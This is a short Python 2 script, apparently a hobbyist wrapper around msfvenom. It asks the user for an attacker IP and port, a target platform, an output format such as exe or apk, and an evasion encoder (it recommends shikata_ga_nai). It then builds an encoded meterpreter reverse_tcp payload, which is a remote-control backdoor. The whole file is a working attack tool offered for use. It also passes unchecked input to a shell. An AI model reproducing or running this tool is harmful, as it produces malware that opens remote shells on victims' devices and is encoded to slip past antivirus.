#-*- coding: utf-8 -*-
#!/usr/bin/python
import sys
import os               #Importing LIbraries
import socket
import subprocess
import time
from random import randint

#Defining colors
class bcolors:
	HEADER = '\033[95m' #move
	OKBLUE = '\033[94m' #blue
	OKGREEN = '\033[92m' #green
	WARNING = '\033[93m' #orange                                  
	FAIL = '\033[91m' #red
	ENDC = '\033[0m' #end color
	BOLD = '\033[1m' #gras
	UNDERLINE = '\033[4m' #underline
        BLEUCIEL = '\033[1;36m' #bleuciel
#time calculating command
start_time = time.time()
#clear screen command
os.system("clear")

os.system("figlet msfvenom payload creator by aziz")
print ' '
payload = raw_input("Choose the payload(windows/android/linux) ==> ") #selecting payload 
print ' '
print ("Payload selected ! ==> ") + payload
print ' '
LHOST = raw_input("Enter your IP address (LHOST) ==> ") #selecting LHOST
print ' '
print ("IP address selected ! ==> ") + LHOST
print ' '
LPORT = raw_input("Enter the port (4444) ==> ") #selecting port
print ' '
print ("Port Selected ! ==> ") + LPORT
print ' '
f = raw_input("Choose the payload format(exe/apk) ==> ") #selecting payload format
print ' '
print ("Format Selected ! ==> ") + f
print " "
encoder = raw_input("Choose the encoder (recommend x86/shikata_ga_nai) ==> ") #selecting encoder
print ' '
print ("Encoder Selected ! ==> ") + encoder
print ' '
iterations = raw_input("Choose the iterations number ==> ") #selecting iterations number
print ' '
print ("Iterations Number Selected ! ==> ") + iterations
print ' '
platform = raw_input("Choose the platform (linux/android/windows) ==> ") #selecting the platform
print ' '
print ("Platform Selected ! ==> ") + platform
print ' '
name = raw_input("Choose the payload name : ==> ")
print ' '
print ("Payload Name Selected ! ==> ") + name
print ' '
print 'All Your Options Are Selected Below:'
print ' '
print 'PAYLOAD      ==> ' + payload
print 'LHOST        ==> ' + LHOST
print 'LPORT        ==> ' + LPORT
print 'Arch         ==> x86'
print 'FORMAT       ==> ' + f
print 'ENCODER      ==> ' + encoder
print 'ITERATIONS   ==> ' + iterations
print 'PLATFORM     ==> ' + platform
print 'PAYLOAD NAME ==> ' + name
print ' '
print ' '
os.system("msfvenom -p "+payload+"/meterpreter/reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+" -f "+f+" -e "+encoder+" --platform "+platform+" -i "+iterations+" -o /root/Desktop/"+name+"."+f)
print ' '
print 'Time elapsed:  '+ str(time.time() - start_time)

